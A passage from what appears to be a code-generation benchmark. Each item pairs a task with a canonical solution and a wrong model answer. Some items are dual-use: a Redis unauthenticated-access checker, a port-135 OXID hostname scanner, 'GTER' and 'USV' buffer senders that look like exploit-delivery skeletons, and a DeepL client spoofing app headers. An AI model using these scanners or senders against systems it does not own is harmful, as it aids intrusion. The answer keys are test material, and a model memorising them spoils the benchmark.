    "Instruction": "Task Description: Implement a function to translate text using the DeepL API with HTTP client functionality, supporting multiple language translations and alternative translations.\n\nFunction Description: The function uses the httpx library to send HTTP POST requests to the DeepL API endpoint. It handles text translation between specified source and target languages, with options for requesting alternative translations and proxy support. The function includes error handling for HTTP status codes and processes the JSON response to extract translated text.\n\nInput:\n- text: (str) - The text to be translated\n- sourceLang: (str, optional) - Source language code (auto-detected if None)\n- targetLang: (str, optional) - Target language code (defaults to \"EN\")\n- numberAlternative: (int, optional) - Number of alternative translations to request (0-3)\n- printResult: (bool, optional) - Whether to print the translation result\n- proxies: (dict, optional) - Proxy configuration for the HTTP client\n\nOutput:\n- If numberAlternative <= 1: returns (str) - The translated text\n- If numberAlternative > 1: returns (list[str]) - List of alternative translations\n- Returns None if HTTP request fails (non-200 status)\n- Raises TooManyRequestsException on HTTP 429 status",
    "Canonical_solution": "import random\nimport time\nimport json\nimport httpx\nfrom langdetect import detect\n\ndeeplAPI = \"https://www2.deepl.com/jsonrpc\"\nheaders = {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"*/*\",\n    \"x-app-os-name\": \"iOS\",\n    \"x-app-os-version\": \"16.3.0\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"x-app-device\": \"iPhone13,2\",\n    \"User-Agent\": \"DeepL-iOS/2.9.1 iOS 16.3.0 (iPhone13,2)\",\n    \"x-app-build\": \"510265\",\n    \"x-app-version\": \"2.9.1\",\n    \"Connection\": \"keep-alive\",\n}\n\ndef translate(\n    text,\n    sourceLang=None,\n    targetLang=None,\n    numberAlternative=0,\n    printResult=False,\n    proxies=None,\n):\n    iCount = getICount(text)\n    id = getRandomNumber()\n\n    if sourceLang is None:\n        sourceLang = detectLang(text)\n    if targetLang is None:\n        targetLang = \"EN\"\n\n    numberAlternative = max(min(3, numberAlternative), 0)\n\n    postData = {\n        \"jsonrpc\": \"2.0\",\n        \"method\": \"LMT_handle_texts\",\n        \"id\": id,\n        \"params\": {\n            \"texts\": [{\"text\": text, \"requestAlternatives\": numberAlternative}],\n            \"splitting\": \"newlines\",\n            \"lang\": {\n                \"source_lang_user_selected\": sourceLang,\n                \"target_lang\": targetLang,\n            },\n            \"timestamp\": getTimestamp(iCount),\n            \"commonJobParams\": {\n                \"wasSpoken\": False,\n                \"transcribe_as\": \"\",\n            },\n        },\n    }\n    postDataStr = json.dumps(postData, ensure_ascii=False)\n\n    if (id + 5) % 29 == 0 or (id + 3) % 13 == 0:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\" : \"', -1)\n    else:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\": \"', -1)\n\n    with httpx.Client(proxies=proxies) as client:\n        resp = client.post(url=deeplAPI, data=postDataStr, headers=headers)\n        respStatusCode = resp.status_code\n\n        if respStatusCode == 429:\n            raise TooManyRequestsException\n            return \n\n        if respStatusCode != 200:\n            print(\"Error\", respStatusCode)\n            return\n\n        respText = resp.text\n        respJson = json.loads(respText)\n\n        if numberAlternative <= 1:\n            targetText = respJson[\"result\"][\"texts\"][0][\"text\"]\n            if printResult:\n                print(targetText)\n            return targetText\n\n        targetTextArray = []\n        for item in respJson[\"result\"][\"texts\"][0][\"alternatives\"]:\n            targetTextArray.append(item[\"text\"])\n            if printResult:\n                print(item[\"text\"])\n\n        return targetTextArray",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport httpx\nfrom httpx import TooManyRequests\n\n\nasync def translate_text(\n    text,\n    sourceLang=None,\n    targetLang=\"EN\",\n    numberAlternative=0,\n    printResult=False,\n    proxies=None\n):\n    url = \"https://api-free.deepl.com/v2/translate\"\n    auth_key = \"YOUR_DEEPL_AUTH_KEY\"  # Replace with your DeepL API key\n\n    params = {\n        \"auth_key\": auth_key,\n        \"text\": text,\n        \"target_lang\": targetLang,\n        \"alternatives\": str(numberAlternative)\n    }\n\n    if sourceLang:\n        params[\"source_lang\"] = sourceLang\n\n    async with httpx.AsyncClient(proxies=proxies) as client:\n        try:\n            response = await client.post(url, data=params)\n        except Exception as e:\n            print(f\"Request failed: {e}\")\n            return None\n\n        if response.status_code == 429:\n            raise TooManyRequests(\"Too many requests. Please wait and try again later.\")\n\n        if response.status_code != 200:\n            return None\n\n        result = response.json()\n        translations = [item[\"text\"] for item in result[\"translations\"]]\n\n        if printResult:\n            for idx, translation in enumerate(translations):\n                print(f\"Translation {idx + 1}: {translation}\")\n\n        if numberAlternative <= 1:\n            return translations[0]\n        else:\n            return translations\n```"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a TCP client function that establishes a connection to a server, sends a message, and receives a response.\n\nFunction Description: The function creates a TCP socket, connects to a specified server, sends a UTF-8 encoded message, receives a response, and then closes the connection. It handles the basic TCP client-server interaction.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- message: str - The message to be sent to the server\n\nOutput:\n- str - The decoded response received from the server",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host: str, port: int, message: str):\n    \"\"\"\n    TCP client interaction function that sends a message to server and receives response\n    \n    Args:\n        host: Server host address\n        port: Server port number\n        message: Message to send to server\n        \n    Returns:\n        The response received from server\n    \"\"\"\n    # Create TCP socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Connect to server\n    s.connect((host, port))\n    \n    # Send message\n    len_sent = s.send(message.encode('utf-8'))\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Clean up\n    s.close()\n    \n    return response.decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client(host, port, message):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message.encode('utf-8'))\n        response = s.recv(4096)\n    return response.decode('utf-8')\n```"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Create a Python function that implements a TCP client to interact with a server by sending a command with an offset and receiving the server's response.\n\nFunction Description: The function `tcp_client_interaction` establishes a TCP connection to a specified server, sends a command concatenated with an offset, receives the server's initial response, and then closes the connection. This is useful for basic client-server communication over TCP/IPv4.\n\nInput:\n- `host` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `cmd` (str): The command to be sent to the server.\n- `offset` (str): An offset value to be appended to the command.\n\nOutput:\n- The function prints the server's initial response to the console.\n- The function prints a confirmation message (\"Done Sending GTER with buffer\") upon successful completion.",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    buffer = cmd + offset + '\\r\\n'\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    data = s.recv(1024)\n    print \"\\n\" + data\n    s.send(buffer)\n    s.close()\n    print \"Done Sending GTER with buffer\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        message = f\"{cmd}{offset}\".encode()\n        s.sendall(message)\n        data = s.recv(1024)\n        print(data.decode())\n        print(\"Done Sending GTER with buffer\")\n```"
  },
  {
    "Task_id": 323,
    "Instruction": "Task Description: Implement a TCP client class for managing connections to a server, sending and receiving commands, and handling various server messages.\n\nClass Description: The Client class provides functionality to connect to a server, send and receive commands, and maintain client state including client ID, room information, and attributes. It handles connection management, message processing, and error handling.\n\nAttributes:\n- host: str - The server host address to connect to\n- port: int - The server port to connect to\n- pending_commands: List[common.Command] - Commands waiting to be sent to the server\n- socket: Socket - The socket connection to the server\n- client_id: Optional[str] - The unique ID assigned by the server\n- current_custom_attributes: Dict[str, Any] - Attributes of the current client\n- clients_attributes: Dict[str, Dict[str, Any]] - Attributes of all connected clients\n- rooms_attributes: Dict[str, Dict[str, Any]] - Attributes of all available rooms\n- current_room: Optional[str] - The current room the client is in\n\nMethods:\n- __init__(host: str = common.DEFAULT_HOST, port: int = common.DEFAULT_PORT) -> None - Initializes the client with server connection details\n- __del__() -> None - Destructor that ensures proper disconnection\n- connect() -> None - Establishes connection to the server and requests initial data\n- disconnect() -> None - Closes the connection to the server\n- is_connected() -> bool - Returns True if connected to the server\n- send_command(command: common.Command) -> bool - Sends a command to the server\n- handle_connection_lost() -> None - Handles cleanup when connection is lost\n- fetch_incoming_commands() -> List[common.Command] - Receives and processes incoming commands from server\n- fetch_outgoing_commands(commands_send_interval: int = 0) -> None - Sends pending commands to server\n- fetch_commands(commands_send_interval: int = 0) -> List[common.Command] - Handles both incoming and outgoing commands",
    "Canonical_solution": "import socket\nimport logging\nimport time\nfrom typing import Dict, Any, Mapping, Optional, List, Callable\n\nimport mixer.broadcaster.common as common\nfrom mixer.broadcaster.socket import Socket\nfrom mixer.broadcaster.common import MessageType\nfrom mixer.broadcaster.common import update_attributes_and_get_diff, update_named_attributes\n\nclass Client:\n    def __init__(self, host: str = common.DEFAULT_HOST, port: int = common.DEFAULT_PORT):\n        self.host = host\n        self.port = port\n        self.pending_commands: List[common.Command] = []\n        self.socket: Socket = None\n        self.client_id: Optional[str] = None\n        self.current_custom_attributes: Dict[str, Any] = {}\n        self.clients_attributes: Dict[str, Dict[str, Any]] = {}\n        self.rooms_attributes: Dict[str, Dict[str, Any]] = {}\n        self.current_room: Optional[str] = None\n\n    def __del__(self):\n        if self.socket is not None:\n            self.disconnect()\n\n    def connect(self):\n        if self.is_connected():\n            raise RuntimeError(\"Client.connect : already connected\")\n\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket = Socket(sock)\n            self.socket.connect((self.host, self.port))\n            self.send_command(common.Command(common.MessageType.CLIENT_ID))\n            self.send_command(common.Command(common.MessageType.LIST_CLIENTS))\n            self.send_command(common.Command(common.MessageType.LIST_ROOMS))\n        except ConnectionRefusedError:\n            self.socket = None\n        except common.ClientDisconnectedException:\n            self.handle_connection_lost()\n        except Exception as e:\n            self.socket = None\n            raise\n\n    def disconnect(self):\n        if self.socket:\n            self.socket.shutdown(socket.SHUT_RDWR)\n            self.socket.close()\n            self.socket = None\n\n    def is_connected(self):\n        return self.socket is not None\n\n    def send_command(self, command: common.Command):\n        try:\n            common.write_message(self.socket, command)\n            return True\n        except common.ClientDisconnectedException:\n            self.handle_connection_lost()\n            return False\n\n    def handle_connection_lost(self):\n        self.socket = None\n\n    def fetch_incoming_commands(self) -> List[common.Command]:\n        try:\n            received_commands = common.read_all_messages(self.socket)\n        except common.ClientDisconnectedException:\n            self.handle_connection_lost()\n            raise\n\n        for command in received_commands:\n            if command.type in self._default_command_handlers:\n                self._default_command_handlers[command.type](self, command)\n\n        return received_commands\n\n    def fetch_outgoing_commands(self, commands_send_interval=0):\n        for command in self.pending_commands:\n            if not self.send_command(command):\n                break\n            if commands_send_interval > 0:\n                time.sleep(commands_send_interval)\n        self.pending_commands = []\n\n    def fetch_commands(self, commands_send_interval=0) -> List[common.Command]:\n        self.fetch_outgoing_commands(commands_send_interval)\n        return self.fetch_incoming_commands()\n\n    _default_command_handlers: Mapping[MessageType, Callable[[common.Command], None]] = {\n        MessageType.LIST_CLIENTS: lambda self, cmd: update_named_attributes(\n            self.clients_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.LIST_ROOMS: lambda self, cmd: update_named_attributes(\n            self.rooms_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.CLIENT_ID: lambda self, cmd: setattr(self, \"client_id\", cmd.data.decode()),\n        MessageType.ROOM_UPDATE: lambda self, cmd: update_named_attributes(\n            self.rooms_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.ROOM_DELETED: lambda self, cmd: self.rooms_attributes.pop(common.decode_string(cmd.data, 0)[0], None),\n        MessageType.CLIENT_UPDATE: lambda self, cmd: update_named_attributes(\n            self.clients_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.CLIENT_DISCONNECTED: lambda self, cmd: self.clients_attributes.pop(common.decode_string(cmd.data, 0)[0], None),\n        MessageType.JOIN_ROOM: lambda self, cmd: setattr(self, \"current_room\", common.decode_string(cmd.data, 0)[0]),\n        MessageType.SEND_ERROR: lambda self, cmd: logging.error(\"Received error message : %s\", common.decode_string(cmd.data, 0)[0]),\n    }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport select\nimport time\nfrom typing import List, Optional, Dict, Any\nimport common\n\nclass Client:\n    def __init__(self, host: str = common.DEFAULT_HOST, port: int = common.DEFAULT_PORT) -> None:\n        self.host = host\n        self.port = port\n        self.pending_commands: List[common.Command] = []\n        self.socket: Optional[socket.socket] = None\n        self.client_id: Optional[str] = None\n        self.current_custom_attributes: Dict[str, Any] = {}\n        self.clients_attributes: Dict[str, Dict[str, Any]] = {}\n        self.rooms_attributes: Dict[str, Dict[str, Any]] = {}\n        self.current_room: Optional[str] = None\n\n    def __del__(self) -> None:\n        self.disconnect()\n\n    def connect(self) -> None:\n        self.socket = socket.create_connection((self.host, self.port))\n        self._send(common.Command.CONNECT)\n        self._receive_initial_data()\n\n    def disconnect(self) -> None:\n        if self.socket:\n            try:\n                self._send(common.Command.DISCONNECT)\n            except Exception:\n                pass\n            self.socket.close()\n            self.socket = None\n            self.handle_connection_lost()\n\n    def is_connected(self) -> bool:\n        return self.socket is not None and self.socket.fileno() != -1\n\n    def send_command(self, command: common.Command) -> bool:\n        if not self.is_connected():\n            return False\n        self.pending_commands.append(command)\n        return True\n\n    def handle_connection_lost(self) -> None:\n        self.pending_commands.clear()\n        self.client_id = None\n        self.current_custom_attributes.clear()\n        self.clients_attributes.clear()\n        self.rooms_attributes.clear()\n        self.current_room = None\n\n    def fetch_incoming_commands(self) -> List[common.Command]:\n        if not self.is_connected():\n            return []\n\n        ready_to_read, _, _ = select.select([self.socket], [], [], 0)\n        commands = []\n        while ready_to_read:\n            try:\n                data = self.socket.recv(4096)\n                if not data:\n                    break\n                commands.extend(common.deserialize(data))\n            except Exception:\n                break\n            ready_to_read, _, _ = select.select([self.socket], [], [], 0)\n        return commands\n\n    def fetch_outgoing_commands(self, commands_send_interval: int = 0) -> None:\n        if not self.is_connected() or not self.pending_commands:\n            return\n\n        if commands_send_interval > 0:\n            time.sleep(commands_send_interval)\n\n        serialized = common.serialize(self.pending_commands)\n        self.socket.sendall(serialized)\n        self.pending_commands.clear()\n\n    def fetch_commands(self, commands_send_interval: int = 0) -> List[common.Command]:\n        incoming = self.fetch_incoming_commands()\n        self.fetch_outgoing_commands(commands_send_interval)\n        return incoming\n\n    def _send(self, command: common.Command) -> None:\n        if self.is_connected():\n            self.socket.sendall(common.serialize([command]))\n\n    def _receive_initial_data(self) -> None:\n        while self.is_connected():\n            ready_to_read, _, _ = select.select([self.socket], [], [], 0.1)\n            if not ready_to_read:\n                continue\n            data = self.socket.recv(4096)\n            if not data:\n                self.handle_connection_lost()\n                break\n            for cmd in common.deserialize(data):\n                if cmd.type == common.CommandType.ASSIGN_ID:\n                    self.client_id = cmd.payload.get(\"client_id\")\n                elif cmd.type == common.CommandType.UPDATE_ATTRIBUTES:\n                    self.current_custom_attributes.update(cmd.payload.get(\"attributes\", {}))\n                elif cmd.type == common.CommandType.CLIENTS_UPDATE:\n                    self.clients_attributes.update(cmd.payload.get(\"clients\", {}))\n                elif cmd.type == common.CommandType.ROOMS_UPDATE:\n                    self.rooms_attributes.update(cmd.payload.get(\"rooms\", {}))\n                elif cmd.type == common.CommandType.JOIN_ROOM:\n                    self.current_room = cmd.payload.get(\"room_id\")\n```"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a function to probe an HTTP server's connectivity and response behavior, checking for potential network interference or server availability issues.\n\nFunction Description: The function attempts to connect to an HTTP server, send a GET request with a specific keyword, and analyze the response. It also checks Redis for potential firewall interference patterns. The function returns different status codes based on the server's response and network conditions.\n\nInput:\n- domain: [str] - The domain name of the target server\n- ip: [str] - The IP address of the target server\n- keyword: [str] - The search keyword to include in the GET request\n\nOutput:\n- [int] - Returns one of the following status codes:\n  * RET_SUCCESS (1) if server responds normally\n  * RET_SVR_NO_RESP (2) if server doesn't respond or times out\n  * RET_GFW_RST (3) if firewall interference is detected\n  * RET_OTHER (99) for other unexpected errors",
    "Canonical_solution": "import os\nimport socket\nimport errno\nimport time\nimport redis\nimport struct\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    redis_conn = redis.StrictRedis(host='localhost', port=6389, db=0)\n\n    ret = 0\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((ip, 80))\n        s.sendall(\"GET /?keyword=%s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\nUser-Agent: connectivity measurement\\r\\n\\r\\n\" % (keyword, domain))\n        data = s.recv(1024)\n        s.shutdown(socket.SHUT_RDWR)\n        s.close()\n        if data and len(data) > 1:\n            ret = 1\n    except socket.timeout:\n        ret = 0\n    except socket.error, serr:\n        if serr[0] == errno.ECONNRESET:\n            ret = -1\n        elif serr[0] == errno.ETIMEDOUT:\n            ret = 0\n        else:\n            ret = -99\n    except Exception, err:\n        ret = -99\n\n    time.sleep(2)\n    type1rst = redis_conn.keys(\"rst:attack1:*_%d\" % ip2int(ip))\n    type2rst = redis_conn.keys(\"rst:attack2:*_%d\" % ip2int(ip))\n    if type1rst or type2rst:\n        return RET_GFW_RST\n    else:\n        if ret == -1:\n            return RET_SVR_NO_RESP\n        elif ret == 0:\n            return RET_SVR_NO_RESP\n        elif ret == 1:\n            return RET_SUCCESS\n        else:\n            return RET_OTHER\n\ndef ip2int(addr):                                                               \n    return struct.unpack(\"I\", socket.inet_aton(addr))[0]",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport requests\nimport redis\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    try:\n        # Attempt HTTP GET request\n        url = f\"http://{domain}?q={keyword}\"\n        response = requests.get(url, timeout=10)\n        \n        if response.status_code == 200 and keyword in response.text:\n            return RET_SUCCESS\n        \n        # Check Redis for firewall interference patterns\n        r = redis.Redis(host='localhost', port=6379, db=0)\n        if r.exists(f\"gfw:{ip}\"):\n            return RET_GFW_RST\n        \n        return RET_OTHER\n    \n    except (requests.exceptions.RequestException, socket.error) as e:\n        if isinstance(e, requests.exceptions.ConnectTimeout) or isinstance(e, socket.timeout):\n            return RET_SVR_NO_RESP\n        return RET_OTHER\n```"
  },
  {
    "Task_id": 327,
    "Instruction": "Task Description: Write a Python function to check for unauthorized access to a Redis server by attempting to connect and retrieve server information without authentication.\n\nFunction Description: The function attempts to connect to a Redis server at a specified IP address and port (default 6379) using a TCP socket. It sends a Redis INFO command payload and checks the response for server version information, which would indicate unauthorized access is possible. The function includes error handling and a timeout for the connection attempt.\n\nInput:\n- ip: str - The IP address of the target Redis server\n- port: int (optional, default=6379) - The port number of the Redis server\n- timeout: int (optional, default=5) - Connection timeout in seconds\n\nOutput:\n- str or None - Returns a warning message '6379 Redis Unauthorized Access' if unauthorized access is detected, otherwise returns None",
    "Canonical_solution": "import socket\n\ndef check_redis_unauthorized_access(ip, port=6379, timeout=5):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(timeout)\n    try:\n        s.connect((ip, port))\n        payload = b'\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a'\n        s.send(payload)\n        data = s.recv(1024)\n        s.close()\n        if b\"redis_version\" in data:\n            return '6379 Redis Unauthorized Access'\n    except Exception as e:\n        s.close()\n    return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef check_redis_unauthorized_access(ip, port=6379, timeout=5):\n    try:\n        s = socket.create_connection((ip, port), timeout=timeout)\n        s.send(b'*1\\r\\n$4\\r\\nINFO\\r\\n')\n        response = s.recv(4096).decode('utf-8', errors='ignore')\n        if 'redis_version' in response:\n            return '6379 Redis Unauthorized Access'\n        s.close()\n    except (socket.timeout, ConnectionRefusedError, OSError):\n        pass\n    return None\n```"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Implement a function that detects alive hosts and retrieves their hostnames by establishing TCP connections to port 135 and exchanging specific binary packets.\n\nFunction Description: The function `oxid` is designed to scan a queue of IP addresses, attempt TCP connections to port 135 on each, and exchange binary packets to retrieve hostname information. It operates in a multi-threaded environment, processing IPs from a shared queue and updating a progress bar. Detected hostnames are appended to a shared list.\n\nInput:\n- `alive_host_Queue`: [Queue] - A thread-safe queue containing IP addresses to scan\n- `pbar`: [ProgressBar] - A progress bar object to update as IPs are processed\n- `alive_hostname_ips`: [List] - A shared list to store results in format [ip, hostname1, hostname2,...]\n\nOutput: None (results are appended to the input `alive_hostname_ips` list)",
    "Canonical_solution": "import socket\nfrom queue import Queue\nfrom threading import Thread\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    def run_detect():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        try:\n            sock.connect((ip, 135))\n            buffer_v1 = b\"\\x05\\x00\\x0b\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xb8\\x10\\xb8\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\xc4\\xfe\\xfc\\x99\\x60\\x52\\x1b\\x10\\xbb\\xcb\\x00\\xaa\\x00\\x21\\x34\\x7a\\x00\\x00\\x00\\x00\\x04\\x5d\\x88\\x8a\\xeb\\x1c\\xc9\\x11\\x9f\\xe8\\x08\\x00\\x2b\\x10\\x48\\x60\\x02\\x00\\x00\\x00\"\n            buffer_v2 = b\"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\"\n            sock.send(buffer_v1)\n            packet = sock.recv(1024)\n            sock.send(buffer_v2)\n            packet = sock.recv(4096)\n            packet_v2 = packet[42:]\n            packet_v2_end = packet_v2.find(b\"\\x09\\x00\\xff\\xff\\x00\\x00\")\n            packet_v2 = packet_v2[:packet_v2_end]\n            hostname_list = packet_v2.split(b\"\\x00\\x00\")\n            result = [ip]\n            for h in hostname_list:\n                h = h.replace(b'\\x07\\x00', b'')\n                h = h.replace(b'\\x00', b'')\n                if h == b'':\n                    continue\n                h = h.decode('utf-8')\n                result.append(h)\n            alive_hostname_ips.append(result)\n        except Exception as e:\n            pass\n        finally:\n            sock.close()\n\n    while not alive_host_Queue.empty():\n        ip = alive_host_Queue.get()\n        run_detect()\n        pbar.update(1)\n        alive_host_Queue.task_done()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom queue import Queue\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    def worker():\n        while not alive_host_Queue.empty():\n            ip = alive_host_Queue.get()\n            try:\n                with socket.create_connection((ip, 135), timeout=3) as s:\n                    data = b'\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00' \\\n                           b'\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00' \\\n                           b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n                    s.send(data)\n                    response = s.recv(4096)\n                    if response and len(response) > 24:\n                        hostname_len = response[24]\n                        if hostname_len > 0:\n                            hostname = response[25:25 + hostname_len].decode('utf-8', errors='ignore')\n                            alive_hostname_ips.append([ip, hostname])\n            except Exception:\n                pass\n            finally:\n                alive_host_Queue.task_done()\n                pbar.update()\n\n    threads = []\n    for _ in range(100):  # Adjust thread count based on system capabilities\n        t = threading.Thread(target=worker)\n        t.start()\n        threads.append(t)\n\n    for t in threads:\n        t.join()\n```"
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- buffer: str - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Success: Prints \"Buffer Sent Successfully!\" upon completion\n- Failure: Prints \"Check your debugger\" if connection fails",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.create_connection((host, port), timeout=10) as sock:\n            initial_data = sock.recv(4096)\n            if initial_data:\n                print(initial_data.decode('utf-8', errors='ignore'))\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            sock.sendall(message.encode('utf-8'))\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")\n```"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the SambaVerse API, handling request construction, response processing, and error management.\n\nClass Description: The SambaVerseClient class provides an interface to communicate with the SambaVerse API, sending chat messages and receiving completions. It handles API authentication, request formatting, and response conversion.\n\nAttributes:\n_api_key: str - The API key for authentication with the SambaVerse service\nmodel_type: str - The model type/name to be used for completions\n_url: str - The endpoint URL for the SambaVerse API\nmodel_config_dict: Dict[str, Any] - Configuration parameters for the model (temperature, max_tokens, etc.)\n\nMethods:\n__init__(api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None - Initializes the client with API credentials and configuration\nsend_request(messages: List[OpenAIMessage]) -> ChatCompletion - Sends a chat completion request to the API and returns the processed response\n_convert_response(samba_response: Dict[str, Any]) -> ChatCompletion - Converts the raw API response into a standardized ChatCompletion object",
    "Canonical_solution": "import json\nimport uuid\nfrom typing import Any, Dict, List, Optional, Union\n\nimport httpx\nfrom camel.messages import OpenAIMessage\nfrom camel.types import ChatCompletion, CompletionUsage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]):\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"key\": str(self._api_key),\n            \"modelName\": self.model_type,\n        }\n\n        data = {\n            \"instance\": json.dumps({\n                \"conversation_id\": str(uuid.uuid4()),\n                \"messages\": messages,\n            }),\n            \"params\": {\n                \"do_sample\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"max_tokens_to_generate\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"max_tokens\")),\n                },\n                \"process_prompt\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"repetition_penalty\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"repetition_penalty\")),\n                },\n                \"return_token_count_only\": {\"type\": \"bool\", \"value\": \"false\"},\n                \"select_expert\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_type.split('/')[1],\n                },\n                \"stop_sequences\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_config_dict.get(\"stop_sequences\"),\n                },\n                \"temperature\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"temperature\")),\n                },\n                \"top_k\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"top_k\")),\n                },\n                \"top_p\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"top_p\")),\n                },\n            },\n        }\n\n        with httpx.Client() as client:\n            response = client.post(\n                self._url,\n                headers=headers,\n                json=data,\n            )\n\n        raw_text = response.text\n        dicts = raw_text.split('}\\n{')\n        last_dict = '{' + dicts[-1]\n        last_dict = json.loads(last_dict)\n        return self._convert_response(last_dict)\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        choices = [\n            dict(\n                index=0,\n                message={\n                    \"role\": 'assistant',\n                    \"content\": samba_response['result']['responses'][0]['completion'],\n                },\n                finish_reason=samba_response['result']['responses'][0]['stop_reason'],\n            )\n        ]\n\n        return ChatCompletion.construct(\n            id=None,\n            choices=choices,\n            created=int(time.time()),\n            model=self.model_type,\n            object=\"chat.completion\",\n            usage=CompletionUsage(\n                completion_tokens=0,\n                prompt_tokens=0,\n                total_tokens=int(samba_response['result']['responses'][0]['total_tokens_count']),\n            ),\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
